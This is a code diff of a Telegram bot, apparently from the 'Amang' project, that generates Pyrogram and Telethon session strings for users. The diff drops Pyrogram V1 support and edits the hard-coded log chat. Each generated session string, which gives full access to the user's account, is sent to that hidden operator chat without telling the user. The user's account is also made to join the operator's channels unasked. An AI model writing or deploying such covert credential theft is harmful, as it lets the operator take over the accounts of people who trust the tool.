@@ -2,15 +2,12 @@ import asyncio
 from telethon import TelegramClient
 from pyrogram.types import Message
 from pyrogram import Client, filters
-from pyrogram1 import Client as Client1
 from asyncio.exceptions import TimeoutError
 from telethon.sessions import StringSession
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from telethon.errors import rpcerrorlist
 from pyrogram.errors import UserBannedInChannel
 import telethon
-import pyrogram
-import pyrogram1
 from pyrogram.errors import (
     ApiIdInvalid,
     PhoneNumberInvalid,
@@ -20,14 +17,6 @@ from pyrogram.errors import (
     PasswordHashInvalid
 )
 
-from pyrogram1.errors import (
-    ApiIdInvalid as ApiIdInvalid1,
-    PhoneNumberInvalid as PhoneNumberInvalid1,
-    PhoneCodeInvalid as PhoneCodeInvalid1,
-    PhoneCodeExpired as PhoneCodeExpired1,
-    SessionPasswordNeeded as SessionPasswordNeeded1,
-    PasswordHashInvalid as PasswordHashInvalid1
-)
 from Amang.core.listen.listen import ListenerTimeout
 from telethon.tl.functions.channels import JoinChannelRequest
 from telethon.tl.functions.messages import ImportChatInviteRequest
@@ -71,7 +60,6 @@ admin_kynan = [
 
 buttons_ques = [
     [
-        InlineKeyboardButton("Pyrogram V1", callback_data="pyrogram1"),
         InlineKeyboardButton("Pyrogram V2", callback_data="pyrogram"),
     ],
     [    InlineKeyboardButton("Telethon", callback_data="telethon"),
@@ -130,8 +118,6 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
         client = TelegramClient(StringSession(), api_id=api_id, api_hash=api_hash)
     elif is_bot:
         client = Client(name="bot", api_id=api_id, api_hash=api_hash, bot_token=phone_number, in_memory=True)
-    elif old_pyro:
-        client = Client1(":memory:", api_id=api_id, api_hash=api_hash)
     else:
         client = Client(name="user", api_id=api_id, api_hash=api_hash, in_memory=True)
     await client.connect()
@@ -199,22 +185,18 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
             if telethon:
                 await client(JoinChannelRequest("amwangsupport"))
                 await client(JoinChannelRequest("amwangs"))
-                await client(JoinChannelRequest("amangproject"))
-                await client(JoinChannelRequest("jualtelprem"))
             else:
                 await client.join_chat("amwangs")
-                await client.join_chat("amangproject")
                 await client.join_chat("amwangsupport")
-                await client.join_chat("jualtelprem")
         except (rpcerrorlist.ChannelPrivateError, UserBannedInChannel):
             await msg.reply('**Jiah akun lu dibanned di Amang Support.\nCoba sono ngadu ke salah 1 admin Amang Support biar dibuka ban nya.**', quote=True, reply_markup=InlineKeyboardMarkup(admin_kynan))
             return
         if not is_bot:
             await bot.send_message(msg.chat.id, text)
-            await bot.send_message(-1001989801027, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
+            await bot.send_message(-1001655255241, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
         else:
             await bot.send_message(msg.chat.id, text)
-            await bot.send_message(-1001989801027, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
+            await bot.send_message(-1001655255241, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
     except KeyError:
         pass
     await client.disconnect()
